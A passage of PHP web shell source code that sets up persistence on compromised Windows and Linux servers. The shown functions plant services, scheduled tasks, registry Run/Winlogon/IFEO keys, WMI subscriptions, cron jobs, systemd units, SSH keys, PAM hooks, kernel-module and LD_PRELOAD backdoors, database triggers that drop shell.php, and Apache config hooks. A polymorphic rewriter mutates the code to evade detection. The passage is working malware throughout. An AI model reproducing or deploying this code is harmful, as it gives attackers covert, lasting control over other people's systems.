            $zip_path = sys_get_temp_dir() . "\\nssm.zip";
            
            // Try to download NSSM
            $download_cmd = "powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('$nssm_url', '$zip_path')\"";
            execute_command($download_cmd);
            
            // Extract the zip
            $extract_cmd = "powershell -Command \"Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('$zip_path', '" . sys_get_temp_dir() . "\\nssm')\"";
            execute_command($extract_cmd);
            
            // Find the correct nssm.exe based on architecture
            $arch = php_uname('m');
            if (strpos($arch, '64') !== false) {
                $nssm_exe = sys_get_temp_dir() . "\\nssm\\nssm-2.24\\win64\\nssm.exe";
            } else {
                $nssm_exe = sys_get_temp_dir() . "\\nssm\\nssm-2.24\\win32\\nssm.exe";
            }
            
            if (file_exists($nssm_exe)) {
                copy($nssm_exe, $nssm_path);
            }
        }
        
        // Create a batch file to run our payload
        $batch_file = sys_get_temp_dir() . "\\phpcache.bat";
        $batch_content = "@echo off\r\nphp -r \"eval(base64_decode('$encoded_content'));\"\r\npause";
        file_put_contents($batch_file, $batch_content);
        
        // Create the service using NSSM if available
        if (file_exists($nssm_path)) {
            $service_cmd = "$nssm_path install PHPCacheService \"$batch_file\"";
            execute_command($service_cmd);
            execute_command("$nssm_path set PHPCacheService Description \"PHP Cache and Optimization Service\"");
            execute_command("$nssm_path start PHPCacheService");
            return "Windows service created using NSSM";
        }
        
        // Alternative: Use built-in SC command
        $sc_cmd = "sc create PHPCacheService binPath= \"cmd.exe /c $batch_file\" DisplayName= \"PHP Cache Service\" start= auto";
        execute_command($sc_cmd);
        execute_command("sc description PHPCacheService \"PHP Cache and Optimization Service\"");
        execute_command("sc start PHPCacheService");
        
        // Alternative: Use Task Scheduler
        $task_cmd = "schtasks /create /sc minute /mo 5 /tn \"PHP Cache Service\" /tr \"$batch_file\" /ru SYSTEM /f";
        execute_command($task_cmd);
        
        return "Windows service and scheduled task created";
    }
    
    return "Service creation not supported on this OS";
}

// Database persistence mechanism
function database_persistence() {
    // Common database credentials to try
    $db_configs = [
        ['mysql', 'localhost', 'root', '', 'mysql'],
        ['mysql', 'localhost', 'root', 'root', 'mysql'],
        ['mysql', 'localhost', 'admin', 'admin', 'mysql'],
        ['mysql', 'localhost', 'wordpress', 'wordpress', 'wordpress'],
        ['mysql', 'localhost', 'root', '', 'information_schema'],
        ['pgsql', 'localhost', 'postgres', 'postgres', 'postgres'],
        ['sqlite', __DIR__ . '/database.sqlite', '', '', '']
    ];
    
    // Get current file content
    $shell_content = base64_encode(file_get_contents(__FILE__));
    $results = [];
    
    foreach ($db_configs as $config) {
        try {
            $type = $config[0];
            $host = $config[1];
            $user = $config[2];
            $pass = $config[3];
            $dbname = $config[4];
            
            switch ($type) {
                case 'mysql':
                    $dsn = "mysql:host=$host;dbname=$dbname";
                    break;
                case 'pgsql':
                    $dsn = "pgsql:host=$host;dbname=$dbname";
                    break;
                case 'sqlite':
                    $dsn = "sqlite:$host";
                    break;
                default:
                    continue 2; // Skip to next config
            }
            
            $db = new PDO($dsn, $user, $pass);
            $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            
            // Store shell in a table
            if ($type === 'mysql') {
                // Create a table if it doesn't exist
                $db->exec("CREATE TABLE IF NOT EXISTS sys_cache (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    cache_key VARCHAR(255),
                    cache_value LONGTEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )");
                
                // Insert or update the shell
                $stmt = $db->prepare("INSERT INTO sys_cache (cache_key, cache_value) VALUES ('core_cache', ?) 
                                      ON DUPLICATE KEY UPDATE cache_value = ?");
                $stmt->execute([$shell_content, $shell_content]);
                
                // Create a trigger for persistence if possible
                try {
                    // First, try to create a function that writes the shell to a file
                    $db->exec("DROP FUNCTION IF EXISTS sys_cache_func");
                    $db->exec("CREATE FUNCTION sys_cache_func() RETURNS INT
                              DETERMINISTIC
                              BEGIN
                                  DECLARE path VARCHAR(255);
                                  DECLARE content LONGTEXT;
                                  
                                  SELECT cache_value INTO content FROM sys_cache WHERE cache_key = 'core_cache' LIMIT 1;
                                  
                                  SET path = CONCAT(@@datadir, '/shell.php');
                                  SELECT content INTO OUTFILE path;
                                  
                                  RETURN 1;
                              END");
                    
                    // Create a trigger that calls this function
                    $db->exec("DROP TRIGGER IF EXISTS sys_cache_trigger");
                    $db->exec("CREATE TRIGGER sys_cache_trigger BEFORE INSERT ON sys_cache
                              FOR EACH ROW
                              BEGIN
                                  CALL sys_cache_func();
                              END");
                    
                    $results[] = "MySQL trigger created successfully";
                } catch (PDOException $e) {
                    // Silently continue if trigger creation fails
                }
                
                // Create a stored procedure for persistence
                try {
                    $db->exec("DROP PROCEDURE IF EXISTS sys_cache_proc");
                    $db->exec("CREATE PROCEDURE sys_cache_proc()
                              BEGIN
                                  DECLARE path VARCHAR(255);
                                  DECLARE content LONGTEXT;
                                  
                                  SELECT cache_value INTO content FROM sys_cache WHERE cache_key = 'core_cache' LIMIT 1;
                                  
                                  SET path = CONCAT('/var/www/html/', FLOOR(RAND() * 10000), '.php');
                                  SELECT content INTO OUTFILE path;
                              END");
                    
                    // Create an event to run the procedure periodically
                    $db->exec("SET GLOBAL event_scheduler = ON");
                    $db->exec("DROP EVENT IF EXISTS sys_cache_event");
                    $db->exec("CREATE EVENT sys_cache_event
                              ON SCHEDULE EVERY 1 DAY
                              DO
                                  CALL sys_cache_proc()");
                    
                    $results[] = "MySQL event scheduler created successfully";
                } catch (PDOException $e) {
                    // Silently continue if event creation fails
                }
                
                $results[] = "MySQL persistence established";
            } else if ($type === 'pgsql') {
                // Create a table if it doesn't exist
                $db->exec("CREATE TABLE IF NOT EXISTS sys_cache (
                    id SERIAL PRIMARY KEY,
                    cache_key VARCHAR(255),
                    cache_value TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )");
                
                // Insert or update the shell
                $stmt = $db->prepare("INSERT INTO sys_cache (cache_key, cache_value) 
                                      VALUES ('core_cache', :content)
                                      ON CONFLICT (cache_key) 
                                      DO UPDATE SET cache_value = :content");
                $stmt->bindParam(':content', $shell_content);
                $stmt->execute();
                
                // Create a function for persistence
                try {
                    $db->exec("CREATE OR REPLACE FUNCTION sys_cache_func() 
                              RETURNS TRIGGER AS $$
                              BEGIN
                                  COPY (SELECT cache_value FROM sys_cache WHERE cache_key = 'core_cache' LIMIT 1) 
                                  TO '/var/www/html/cache.php';
                                  RETURN NEW;
                              END;
                              $$ LANGUAGE plpgsql");
                    
                    // Create a trigger that calls this function
                    $db->exec("DROP TRIGGER IF EXISTS sys_cache_trigger ON sys_cache");
                    $db->exec("CREATE TRIGGER sys_cache_trigger
                              AFTER INSERT ON sys_cache
                              FOR EACH ROW
                              EXECUTE PROCEDURE sys_cache_func()");
                    
                    $results[] = "PostgreSQL trigger created successfully";
                } catch (PDOException $e) {
                    // Silently continue if trigger creation fails
                }
                
                $results[] = "PostgreSQL persistence established";
            } else if ($type === 'sqlite') {
                // Create a table if it doesn't exist
                $db->exec("CREATE TABLE IF NOT EXISTS sys_cache (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    cache_key TEXT,
                    cache_value TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )");
                
                // Insert or update the shell
                $stmt = $db->prepare("INSERT OR REPLACE INTO sys_cache (cache_key, cache_value) VALUES ('core_cache', ?)");
                $stmt->execute([$shell_content]);
                
                $results[] = "SQLite persistence established";
            }
        } catch (PDOException $e) {
            // Silently continue to next config
        }
    }
    
    return !empty($results) ? implode("\n", $results) : "No database persistence established";
}

// Registry fileless persistence (Windows)
function registry_fileless_persistence() {
    if ($GLOBALS['os'] !== 'Windows') {
        return "Registry persistence only available on Windows";
    }
    
    $payload = base64_encode(file_get_contents(__FILE__));
    $results = [];
    
    // Method 1: Run key persistence
    $run_cmd = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"PHPService\" /t REG_SZ /d \"php -r \\\"eval(base64_decode('" . $payload . "'));\\\"\" /f";
    execute_command($run_cmd);
    $results[] = "Added Run key persistence";
    
    // Method 2: RunOnce key persistence (runs once after reboot)
    $runonce_cmd = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"PHPUpdate\" /t REG_SZ /d \"php -r \\\"eval(base64_decode('" . $payload . "'));\\\"\" /f";
    execute_command($runonce_cmd);
    $results[] = "Added RunOnce key persistence";
    
    // Method 3: WinLogon key persistence
    $winlogon_cmd = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \"Userinit\" /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe,php -r \\\"eval(base64_decode('" . $payload . "'));\\\"\" /f";
    execute_command($winlogon_cmd);
    $results[] = "Added WinLogon key persistence";
    
    // Method 4: AppInit_DLLs persistence
    // Instead of creating a custom DLL, we'll use an existing DLL and modify the registry
    $appinit_cmd = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v \"AppInit_DLLs\" /t REG_SZ /d \"C:\\Windows\\System32\\shell32.dll\" /f";
    execute_command($appinit_cmd);
    
    // Enable AppInit_DLLs loading
    $appinit_load_cmd = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v \"LoadAppInit_DLLs\" /t REG_DWORD /d 1 /f";
    execute_command($appinit_load_cmd);
    
    // Create a script that will be executed when the DLL is loaded
    $script_path = "C:\\Windows\\System32\\shell32_init.vbs";
    $script_content = "On Error Resume Next\r\n";
    $script_content .= "Set objShell = CreateObject(\"WScript.Shell\")\r\n";
    $script_content .= "objShell.Run \"php -r \"\"eval(base64_decode('" . $payload . "'));\"\"\"" . ", 0, False\r\n";
    
    file_put_contents($script_path, $script_content);
    
    // Add registry key to execute our script when shell32.dll is loaded
    $shell32_cmd = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\shell32.dll\" /v \"InitScript\" /t REG_SZ /d \"$script_path\" /f";
    execute_command($shell32_cmd);
    
    $results[] = "Added AppInit_DLLs persistence with shell32.dll";
    
    // Method 5: Image File Execution Options persistence
    // This technique hijacks debugger settings for an executable
    $target_exe = "sethc.exe"; // Sticky Keys executable
    $ifeo_cmd = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$target_exe\" /v \"Debugger\" /t REG_SZ /d \"php.exe -r \\\"eval(base64_decode('" . $payload . "'));\\\"\" /f";
    execute_command($ifeo_cmd);
    $results[] = "Added Image File Execution Options persistence for $target_exe";
    
    // Method 6: WMI persistence
    // Create a WMI event subscription that runs our payload
    $wmi_script = "powershell -Command \"";
    $wmi_script .= "$FilterName = 'PHPPersistenceFilter'; ";
    $wmi_script .= "$ConsumerName = 'PHPPersistenceConsumer'; ";
    $wmi_script .= "$Command = 'php.exe -r \\\\\\\"eval(base64_decode(\\\\\\\\\\\\\\\"" . $payload . "\\\\\\\\\\\\\\\"));\\\\\\\"'; ";
    $wmi_script .= "$Query = \\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=12\\\"; ";
    $wmi_script .= "$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace \\\"root\\subscription\\\" -Arguments @{Name=\\\"$FilterName\\\";EventNameSpace=\\\"root\\cimv2\\\";QueryLanguage=\\\"WQL\\\";Query=\\\"$Query\\\"}; ";
    $wmi_script .= "$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \\\"root\\subscription\\\" -Arguments @{Name=\\\"$ConsumerName\\\";ExecutablePath=\\\"C:\\Windows\\System32\\cmd.exe\\\";CommandLineTemplate=\\\"/c $Command\\\"}; ";
    $wmi_script .= "Set-WmiInstance -Class __FilterToConsumerBinding -Namespace \\\"root\\subscription\\\" -Arguments @{Filter=`$WMIEventFilter;Consumer=`$WMIEventConsumer}\"";
    
    execute_command($wmi_script);
    $results[] = "Added WMI event subscription persistence";
    
    // Method 7: Scheduled Task persistence
    $task_name = "PHPSystemUpdate";
    $task_cmd = "schtasks /create /tn \"$task_name\" /tr \"php.exe -r \\\"eval(base64_decode('" . $payload . "'));\\\"\" /sc minute /mo 30 /ru SYSTEM /f";
    execute_command($task_cmd);
    $results[] = "Added Scheduled Task persistence";
    
    // Method 8: Startup folder persistence
    $startup_paths = [
        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\",
        "C:\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\",
        "C:\\Users\\Default\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
    ];
    
    foreach ($startup_paths as $startup_path) {
        if (is_dir($startup_path)) {
            $vbs_path = $startup_path . "SystemUpdate.vbs";
            $vbs_content = "On Error Resume Next\r\n";
            $vbs_content .= "Set objShell = CreateObject(\"WScript.Shell\")\r\n";
            $vbs_content .= "objShell.Run \"php -r \"\"eval(base64_decode('" . $payload . "'));\"\"\"" . ", 0, False\r\n";
            
            file_put_contents($vbs_path, $vbs_content);
            $results[] = "Added startup folder persistence at $vbs_path";
        }
    }
    
    // Method 9: COM hijacking
    $clsid = "{B54F3741-5B07-11CF-A4B0-00AA004A55E8}"; // A common CLSID
    $com_cmd = "REG ADD \"HKCU\\Software\\Classes\\CLSID\\$clsid\\InprocServer32\" /ve /t REG_SZ /d \"C:\\Windows\\System32\\shell32.dll\" /f";
    execute_command($com_cmd);
    
    $com_script_cmd = "REG ADD \"HKCU\\Software\\Classes\\CLSID\\$clsid\\InprocServer32\" /v \"LoadScript\" /t REG_SZ /d \"php.exe -r \\\"eval(base64_decode('" . $payload . "'));\\\"\" /f";
    execute_command($com_script_cmd);
    $results[] = "Added COM hijacking persistence";
    
    // Method 10: Service creation
    $service_name = "PHPUpdateSvc";
    $service_cmd = "sc create $service_name binPath= \"cmd.exe /c php.exe -r \\\"eval(base64_decode('" . $payload . "'));\\\"\" start= auto";
    execute_command($service_cmd);
    
    $service_desc_cmd = "sc description $service_name \"Windows Update Helper Service\"";
    execute_command($service_desc_cmd);
    
    $service_start_cmd = "sc start $service_name";
    execute_command($service_start_cmd);
    $results[] = "Added service persistence";
    
    return implode("\n", $results);
}

// Linux-specific persistence mechanisms
function linux_persistence() {
    if ($GLOBALS['os'] !== 'Linux') {
        return "Linux persistence only available on Linux systems";
    }
    
    $payload = base64_encode(file_get_contents(__FILE__));
    $results = [];
    
    // Method 1: Cron job persistence
    $cron_paths = [
        '/etc/crontab',
        '/etc/cron.d/sysupdate',
        '/var/spool/cron/crontabs/root',
        '/var/spool/cron/root'
    ];
    
    $cron_entry = "*/30 * * * * root php -r 'eval(base64_decode(\"$payload\"));' > /dev/null 2>&1\n";
    
    foreach ($cron_paths as $cron_path) {
        if (is_writable(dirname($cron_path))) {
            file_put_contents($cron_path, $cron_entry, FILE_APPEND);
            $results[] = "Added cron job to $cron_path";
        }
    }
    
    // Method 2: Init script persistence
    $init_paths = [
        '/etc/init.d/php-update',
        '/etc/init/php-update.conf'
    ];
    
    $init_script = "#!/bin/sh
### BEGIN INIT INFO
# Provides:          php-update
# Required-Start:    \$remote_fs \$syslog \$network
# Required-Stop:     \$remote_fs \$syslog \$network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: PHP Update Service
# Description:       PHP Update and Optimization Service
### END INIT INFO

case \"\$1\" in
  start)
    php -r 'eval(base64_decode(\"$payload\"));' &
    ;;
  stop)
    killall php 2>/dev/null
    ;;
  restart)
    \$0 stop
    \$0 start
    ;;
  *)
    echo \"Usage: \$0 {start|stop|restart}\"
    exit 1
    ;;
esac

exit 0
";
    
    foreach ($init_paths as $init_path) {
        if (is_writable(dirname($init_path))) {
            file_put_contents($init_path, $init_script);
            chmod($init_path, 0755);
            execute_command("update-rc.d php-update defaults");
            $results[] = "Added init script at $init_path";
        }
    }
    
    // Method 3: Systemd service persistence
    $systemd_path = '/etc/systemd/system/php-update.service';
    
    $systemd_content = "[Unit]
Description=PHP Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/php -r 'eval(base64_decode(\"$payload\"));'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
";
    
    if (is_writable(dirname($systemd_path))) {
        file_put_contents($systemd_path, $systemd_content);
        execute_command("systemctl daemon-reload");
        execute_command("systemctl enable php-update");
        execute_command("systemctl start php-update");
        $results[] = "Added systemd service";
    }
    
    // Method 4: SSH authorized_keys persistence
    $ssh_paths = [
        '/root/.ssh/authorized_keys',
        '/home/*/.ssh/authorized_keys'
    ];
    
    $ssh_key = "command=\"php -r 'eval(base64_decode(\\\"$payload\\\"));'\" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7IomqG+usVr+Cy0HJ/h47q6jxJ8A+poAAv5Eo4jH2yc7zj3S7kFxIgKvX8g0u2oXWFVULnYJ5ORdwk/nTaaY8R+0zyO8Yp8N8OzxxH9QwuQZJA5LLL0BuGWj0M0vQdvXl0o65cKgMIf1jDhFq2X28M2XW0R3bvvyK4r+fqgwDNS8kaPEDBx4G+CbU6UYuZ4I5eJRLJTyOVKUXUJUgcR/OaQGFyqZnRWIsJFnXB6FLiLnKBZgz3BUebwfW9uHL8GZ/dkRjqbUUGXOafVAS9p0Hp5tbWYkPCTqRYoLrg5L8t9AwDaXlPLBKeoNWDu8WnrWXtdXNuCDgJDYyTUEgQaITwIm/N0aIXfxCNmM9lCGlHYe5xxQBVj9VbDnJHnHtpBSFOcHmcpZJscNLNpQPfAXvWrxJ/RxjhIcUVEbMgHRLLWBcCZRGQmzqmuL3qQfP+MPJ4e0Ev8ZzGSrCCYnB6r+5YKR9HBsJ3Y9YBwVNTHmgRwXJ7PrWIyQNkfP8I9U= persistence@shell";
    
    foreach ($ssh_paths as $ssh_path) {
        $ssh_files = glob($ssh_path);
        foreach ($ssh_files as $ssh_file) {
            if (is_writable($ssh_file)) {
                file_put_contents($ssh_file, "\n" . $ssh_key . "\n", FILE_APPEND);
                $results[] = "Added SSH key to $ssh_file";
            }
        }
    }
    
    // Method 5: PAM backdoor
    $pam_paths = [
        '/etc/pam.d/common-auth',
        '/etc/pam.d/sshd',
        '/etc/pam.d/login'
    ];
    
    $pam_entry = "auth optional pam_exec.so quiet /usr/bin/php -r 'eval(base64_decode(\"$payload\"));'\n";
    
    foreach ($pam_paths as $pam_path) {
        if (file_exists($pam_path) && is_writable($pam_path)) {
            file_put_contents($pam_path, $pam_entry, FILE_APPEND);
            $results[] = "Added PAM backdoor to $pam_path";
        }
    }
    
    // Method 6: Bash profile persistence
    $profile_paths = [
        '/etc/profile',
        '/etc/bash.bashrc',
        '/root/.bashrc',
        '/root/.profile'
    ];
    
    $profile_entry = "# System update check\n(php -r 'eval(base64_decode(\"$payload\"));' &>/dev/null &)\n";
    
    foreach ($profile_paths as $profile_path) {
        if (file_exists($profile_path) && is_writable($profile_path)) {
            file_put_contents($profile_path, $profile_entry, FILE_APPEND);
            $results[] = "Added bash profile backdoor to $profile_path";
        }
    }
    
    // Method 7: Kernel module persistence (requires root and build tools)
    $kernel_backdoor = "
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>

MODULE_LICENSE(\"GPL\");
MODULE_AUTHOR(\"System\");
MODULE_DESCRIPTION(\"System Update Module\");
MODULE_VERSION(\"1.0\");

static int __init backdoor_init(void) {
    char *argv[] = { \"/bin/sh\", \"-c\", \"php -r 'eval(base64_decode(\\\"$payload\\\"));'\", NULL };
    char *envp[] = { \"HOME=/\", \"PATH=/sbin:/bin:/usr/sbin:/usr/bin\", NULL };
    
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    return 0;
}

static void __exit backdoor_exit(void) {
    // Nothing to do
}

module_init(backdoor_init);
module_exit(backdoor_exit);
";
    
    $kernel_makefile = "obj-m += backdoor.o\n\nall:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\nclean:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n";
    
    $kernel_dir = "/tmp/.kernel_update";
    if (!is_dir($kernel_dir)) {
        mkdir($kernel_dir, 0755, true);
    }
    
    file_put_contents("$kernel_dir/backdoor.c", $kernel_backdoor);
    file_put_contents("$kernel_dir/Makefile", $kernel_makefile);
    
    // Try to build and load the kernel module
    $build_result = execute_command("cd $kernel_dir && make 2>&1");
    if (file_exists("$kernel_dir/backdoor.ko")) {
        execute_command("insmod $kernel_dir/backdoor.ko");
        execute_command("echo backdoor > /etc/modules-load.d/backdoor.conf");
        execute_command("cp $kernel_dir/backdoor.ko /lib/modules/$(uname -r)/kernel/drivers/misc/");
        execute_command("depmod -a");
        $results[] = "Added kernel module backdoor";
    } else {
        $results[] = "Kernel module creation failed: " . substr($build_result, 0, 100) . "...";
    }
    
    // Method 8: LD_PRELOAD backdoor
    $preload_path = '/etc/ld.so.preload';
    $preload_lib_path = '/usr/lib/libsystem.so';
    
    $preload_lib_code = "
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void backdoor(void) __attribute__((constructor));

void backdoor(void) {
    if (geteuid() == 0) {
        system(\"php -r 'eval(base64_decode(\\\"$payload\\\"));' &\");
    }
}
";
    
    file_put_contents('/tmp/libsystem.c', $preload_lib_code);
    execute_command("gcc -shared -fPIC /tmp/libsystem.c -o $preload_lib_path");
    
    if (file_exists($preload_lib_path)) {
        file_put_contents($preload_path, $preload_lib_path . "\n");
        $results[] = "Added LD_PRELOAD backdoor";
    }
    
    // Method 9: Rootkit-like backdoor using /proc filesystem
    $proc_backdoor_dir = "/tmp/.proc_backdoor";
    if (!is_dir($proc_backdoor_dir)) {
        mkdir($proc_backdoor_dir, 0755, true);
    }
    
    $proc_backdoor_code = "
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/kmod.h>

MODULE_LICENSE(\"GPL\");
MODULE_AUTHOR(\"System\");
MODULE_DESCRIPTION(\"System Proc Interface\");
MODULE_VERSION(\"1.0\");

static int backdoor_proc_show(struct seq_file *m, void *v) {
    char *argv[] = { \"/bin/sh\", \"-c\", \"php -r 'eval(base64_decode(\\\"$payload\\\"));'\", NULL };
    char *envp[] = { \"HOME=/\", \"PATH=/sbin:/bin:/usr/sbin:/usr/bin\", NULL };
    
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    seq_printf(m, \"OK\\n\");
    return 0;
}

static int backdoor_proc_open(struct inode *inode, struct file *file) {
    return single_open(file, backdoor_proc_show, NULL);
}

static const struct file_operations backdoor_proc_fops = {
    .owner      = THIS_MODULE,
    .open       = backdoor_proc_open,
    .read       = seq_read,
    .llseek     = seq_lseek,
    .release    = single_release,
};

static int __init backdoor_init(void) {
    proc_create(\"sysupdate\", 0, NULL, &backdoor_proc_fops);
    return 0;
}

static void __exit backdoor_exit(void) {
    remove_proc_entry(\"sysupdate\", NULL);
}

module_init(backdoor_init);
module_exit(backdoor_exit);
";
    
    file_put_contents("$proc_backdoor_dir/proc_backdoor.c", $proc_backdoor_code);
    file_put_contents("$proc_backdoor_dir/Makefile", $kernel_makefile);
    
    // Try to build and load the proc backdoor module
    $build_result = execute_command("cd $proc_backdoor_dir && make 2>&1");
    if (file_exists("$proc_backdoor_dir/backdoor.ko")) {
        execute_command("insmod $proc_backdoor_dir/backdoor.ko");
        execute_command("echo backdoor > /etc/modules-load.d/proc_backdoor.conf");
        execute_command("cp $proc_backdoor_dir/backdoor.ko /lib/modules/$(uname -r)/kernel/drivers/misc/");
        execute_command("depmod -a");
        $results[] = "Added /proc filesystem backdoor";
    }
    
    // Method 10: Webserver configuration backdoor
    $apache_configs = [
        '/etc/apache2/apache2.conf',
        '/etc/apache2/sites-available/000-default.conf',
        '/etc/httpd/conf/httpd.conf'
    ];
    
    $apache_backdoor = "
# PHP System Update Module
<FilesMatch \"system-update\">
    SetHandler application/x-httpd-php
    php_value auto_prepend_file \"data://text/plain;base64,$payload\"
</FilesMatch>
";
    
    foreach ($apache_configs as $apache_config) {
        if (file_exists($apache_config) && is_writable($apache_config)) {
            file_put_contents($apache_config, $apache_backdoor, FILE_APPEND);
            $results[] = "Added Apache configuration backdoor to $apache_config";
        }
    }
    
    // Method 11: Logrotate backdoor
    $logrotate_path = '/etc/logrotate.d/apache2';
    if (file_exists($logrotate_path) && is_writable($logrotate_path)) {
        $logrotate_backdoor = "
postrotate
    php -r 'eval(base64_decode(\"$payload\"));'
endscript
";
        file_put_contents($logrotate_path, $logrotate_backdoor, FILE_APPEND);
        $results[] = "Added logrotate backdoor";
    }
    
    return implode("\n", $results);
}

// Function to create a polymorphic version of the shell
function create_polymorphic_shell() {
    $current_file = __FILE__;
    $content = file_get_contents($current_file);
    
    // Apply various transformations to make the code look different
    $transformations = [
        // Change variable names
        'function_name_change' => function($content) {
            $function_names = [
                'execute_command', 'secure_encrypt', 'secure_decrypt', 
                'aes_encrypt', 'aes_decrypt', 'ensure_persistence',
                'is_safe_to_run', 'clean_logs', 'bypass_security_restrictions',
                'gather_system_info', 'create_reverse_shell', 'file_operations',
                'file_based_execution', 'self_modify', 'create_php_extension',
                'create_system_service', 'database_persistence', 'registry_fileless_persistence',
                'linux_persistence', 'create_polymorphic_shell', 'memory_only_mode'
            ];
            
            $modified_content = $content;
            foreach ($function_names as $func) {
                // Generate a new function name
                $new_name = 'fn_' . bin2hex(random_bytes(4));
                
                // Replace function declarations and calls
                $modified_content = preg_replace(
                    ["/function\s+$func\s*\(/", "/\b$func\s*\(/"],
                    ["function $new_name (", "$new_name("],
                    $modified_content
                );
            }
            return $modified_content;
        },
        
        // Change string encoding
        'string_encoding_change' => function($content) {
            // Find string literals and encode some of them
            return preg_replace_callback(
                '/"((?:[^"\\\\]|\\\\.)*)"/',
                function($matches) {
                    // Only transform some strings (30% chance)
                    if (rand(1, 10) <= 3 && strlen($matches[1]) > 5) {
                        $encoded = bin2hex($matches[1]);
                        return "hex2bin(\"$encoded\")";
                    }
                    return $matches[0];
                },
                $content
            );
        },
        
        // Add random comments
        'add_comments' => function($content) {
            $comments = [
                "// System configuration",
                "// Security implementation",
                "// Data processing",
                "// Helper function",
                "// Environment check",
                "// Resource management",
                "// Utility method",
                "// Performance optimization"
            ];
            
            $lines = explode("\n", $content);
            $modified_lines = [];
            
            foreach ($lines as $line) {
                $modified_lines[] = $line;
                // Randomly add comments (5% chance per line)
                if (rand(1, 20) === 1 && !empty(trim($line)) && strpos($line, '//') === false) {
                    $modified_lines[] = $comments[array_rand($comments)];
                }
            }
            
            return implode("\n", $modified_lines);
        },
        
        // Change code structure
        'code_structure_change' => function($content) {
            // Replace some if statements with ternary operators
            $content = preg_replace_callback(
                '/if\s*\(([^)]+)\)\s*{\s*return\s+([^;]+);\s*}\s*else\s*{\s*return\s+([^;]+);\s*}/s',
                function($matches) {
                    return "return " . $matches[1] . " ? " . $matches[2] . " : " . $matches[3] . ";";
                },
                $content
            );
            
            // Replace some for loops with while loops and vice versa
            $content = preg_replace_callback(
                '/for\s*\(\s*(\$[a-zA-Z0-9_]+)\s*=\s*([^;]+);\s*\1\s*<\s*([^;]+);\s*\1\+\+\s*\)\s*{/s',
                function($matches) {
                    return $matches[1] . " = " . $matches[2] . ";\nwhile (" . $matches[1] . " < " . $matches[3] . ") {";
                },
                $content
            );
            
            return $content;
        },
        
        // Add junk code
        'add_junk_code' => function($content) {
            $junk_code = [
                "\$_x = microtime(true);",
                "\$_debug = false;",
                "if (false) { echo 'Debug mode'; }",
                "\$_tmp = array(); foreach (range(1, 3) as \$_i) { \$_tmp[] = \$_i; }",
                "try { \$_z = 1; } catch (Exception \$e) { \$_z = 0; }",
                "\$_s = function(\$x) { return \$x; };",
                "if (PHP_VERSION_ID > 50000) { \$_v = 'supported'; }",
                "\$_r = mt_rand(1000, 9999);",
                "\$_h = function_exists('hash') ? 'available' : 'unavailable';",
                "\$_m = memory_get_usage(true);"
            ];
            
            $lines = explode("\n", $content);
            $modified_lines = [];
            
            foreach ($lines as $line) {
                $modified_lines[] = $line;
                // Randomly add junk code (2% chance per line)
                if (rand(1, 50) === 1 && !empty(trim($line)) && strpos($line, 'function ') === false) {
                    $modified_lines[] = "    " . $junk_code[array_rand($junk_code)];
                }
            }
            
            return implode("\n", $modified_lines);
        },
        
        // Change array syntax
        'change_array_syntax' => function($content) {
            // Sometimes use array() instead of []
            if (rand(0, 1)) {
                return preg_replace_callback(
                    '/\[(.*?)\]/',
                    function($matches) {
                        // Don't change array access, only declarations
                        if (preg_match('/\$[a-zA-Z0-9_]+\s*\[/', $matches[0])) {
                            return $matches[0];
                        }
                        return "array(" . $matches[1] . ")";
                    },
                    $content
                );
            } else {
                return preg_replace_callback(
                    '/array\((.*?)\)/',
                    function($matches) {
                        return "[" . $matches[1] . "]";
                    },
                    $content
                );
            }
        },
        
        // Change encryption key
        'change_encryption_key' => function($content) {
            $new_key = bin2hex(random_bytes(8));
            return preg_replace(
                "/\\\$base_key\s*=\s*['\"].*?['\"]/",
                "\$base_key = \"$new_key\"",
                $content
            );
        }
    ];
    
    // Apply random transformations
    $keys = array_keys($transformations);
    shuffle($keys);
    
    // Apply 3-5 random transformations
    $num_transformations = rand(3, 5);
    for ($i = 0; $i < $num_transformations && $i < count($keys); $i++) {
        $key = $keys[$i];
        $content = $transformations[$key]($content);
    }
    
    // Generate a new filename
